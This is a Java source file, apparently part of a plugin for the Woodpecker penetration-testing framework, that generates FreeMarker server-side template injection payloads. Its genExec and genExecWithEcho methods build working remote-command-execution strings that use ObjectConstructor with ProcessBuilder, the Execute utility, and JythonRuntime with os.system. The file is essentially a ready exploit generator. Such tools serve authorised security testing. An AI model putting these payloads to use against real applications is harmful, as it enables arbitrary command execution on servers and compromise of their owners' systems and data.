package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;
import me.gv7.woodpecker.plugin.utils.ArgumentTokenizer;

import static me.gv7.woodpecker.plugin.utils.Utils.escape;

public class FreeMarkerExpr implements IExpr {

    @Override
    public String getName() {
        return "FreeMarker";
    }

    @Override
    public String[] genDnslog(String domain) {
        return null;
    }

    @Override
    public String[] genHttplog(String url) {
        return null;
    }

    @Override
    public String[] genSleep(int sec) {
        return null;
    }

    @Override
    public String[] genExec(String command) {
        return new String[]{
                "<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\"," + ArgumentTokenizer.getTokenizedString(command, "\"") + ").start()}"
        };
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[]{
                "<#assign vx=\"freemarker.template.utility.Execute\"?new()> ${ vx(\"" + escape(command, "\"") + "\") }",
                "${\"freemarker.template.utility.Execute\"?new()(\"" + escape(command, "\"") + "\")}",
                "<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()><@value>import os;os.system(\"" + escape(command, "\"") + "\")</@value>"
        };
    }

}
